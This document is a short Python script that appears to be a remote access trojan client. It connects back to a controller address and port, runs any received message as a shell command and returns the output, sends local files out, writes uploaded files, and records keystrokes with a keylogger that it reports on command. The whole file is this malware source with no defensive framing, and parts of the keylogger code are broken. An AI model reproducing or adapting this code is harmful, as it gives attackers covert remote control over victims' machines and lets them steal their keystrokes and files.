import socket
import threading
import subprocess
from pathlib import Path
from pynput.keyboard import Key,Listener

allkeys = ''

def pressed(key):
	global allkeys
	allkeys += str(key)

def released():
	pass

def keylog():
	with Listener(on_press=pressed, on_release=released) as l:
		l.join()

	l = keyboard.Listener(on_press=pressed, on_release=released)
	l.start()


ip = '127.0.0.1'
port = 1234

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip,port))

msg = 'TEST CLIENT'

cs.send(msg.encode())
msg = cs.recv(1024).decode()

while msg != 'quit':
	fullmsg = msg
	msg = list(msg.split(" "))
	if msg[0] == 'download':
		filename = msg[1]
		f = open(Path(filename), 'rb')
		contents = f.read()
		f.close()
		cs.send(contents)
		msg = cs.recv(1024).decode()

	elif msg[0] == 'upload':
		filename = msg[1]
		filesize = int(msg[2])
		f = open(Path(filename), 'wb')
		contents = cs.recv(filesize)
		f.write(contents)
		f.close()
		cs.send('got file'.encode())
		msg = cs.recv(1024).decode()

	elif fullmsg == 'keylog on':
		t1 = threading.Thread(target=keylog)
		t1.start()
		msg = 'Key logging has started!'
		cs.send(msg.encode())

	elif fullmsg == 'keylog off':
		t1.join()
		cs.send(allkeys.encode())
		msg = cs.recv(1024).decode()

	else:
		p = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		output,error = p.communicate()
		if (len(output) > 0):
			msg = str(output.decode())
		else:
			msg = str(error.decode())
		cs.send(msg.encode())
		msg = cs.recv(1024).decode()
	print(msg)
	

cs.close()